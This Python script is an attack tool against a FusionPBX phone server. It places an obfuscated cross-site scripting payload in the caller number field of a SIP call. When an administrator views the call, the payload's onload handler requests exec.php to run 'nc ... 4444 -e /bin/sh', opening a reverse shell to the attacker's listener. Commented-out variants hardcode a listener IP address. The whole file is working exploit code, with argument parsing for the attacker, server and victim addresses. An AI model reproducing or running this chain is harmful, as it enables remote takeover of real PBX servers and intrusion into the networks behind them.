from attack import RceAttack
from argparse import ArgumentParser


def encode(val) -> str:
    ret = ""
    for c in val:
        ret += "\\x%02x" % ord(c)
    return ret


parser = ArgumentParser()
parser.add_argument("--close_rce_sockets", type=bool)
parser.add_argument("--attacker_address", type=str)
parser.add_argument("--fusion_pbx_address", type=str)
parser.add_argument("--rce_listener_address", type=str)
parser.add_argument("--victim_number", type=str)
args = parser.parse_args()

# logo = "<img src='resources/images/kill.png' onload=\"q=new XMLHttpRequest();q.open('GET','exec.php?cmd=system nc 192.168.20.29 4444 -e /bin/sh',true);q.send();\">"
# logo = "514353"
logo = f"\\x3cimg src='resources\\x2fimages\\x2fkill.png' onload=\"q=new XMLHttpRequest()\\x3bq.open('GET','exec.php?cmd=system nc {args.rce_listener_address} 4444 -e \\x2fbin\\x2fsh',true)\\x3bq.send()\\x3b\"\\x3e"
# logo = "q=new XMLHttpRequest()\\x3bq.open('GET','exec.php?cmd=system nc 192.168.20.29 4444 -e \\x2fbin\\x2fsh',true)\\x3bq.send()\\x3b"

rce_attack = RceAttack(
    # attacker_number="24356445",
    # attacker_number=encode(logo),
    attacker_number=logo,
    # attacker_number="resources/images/kill.png",
    attacker_port=52058,
    victim_number=args.victim_number,
    victim_port=53086,
    attacker_address=args.attacker_address,
    fusion_pbx_address=args.fusion_pbx_address)

if args.close_rce_sockets:
    rce_attack.register_victim()
    rce_attack.initiate_call()
else:
    rce_attack.close_sockets()
